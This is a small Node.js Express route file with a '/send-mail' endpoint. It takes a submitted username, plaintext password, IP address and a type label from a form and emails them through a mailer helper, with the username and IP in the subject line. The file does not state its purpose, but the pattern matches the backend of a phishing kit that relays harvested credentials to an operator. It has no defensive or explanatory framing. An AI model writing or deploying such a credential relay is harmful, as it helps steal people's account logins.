const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

router.post('/send-mail', async (req, res) => {
  try {
    const { username, pass, ip, type } = req.body;
    const subject = `${type}: ${username}: ${ip}`;

    await mailer.sendEmail(subject, username, pass, ip, type);

    return res.status(200).json({ response: 'success' });
  } catch (err) {
    console.error('Send-mail error:', err && err.message ? err.message : err);
    return res.status(400).json({ response: 'failed', error: err.message });
  }
});

module.exports = router;
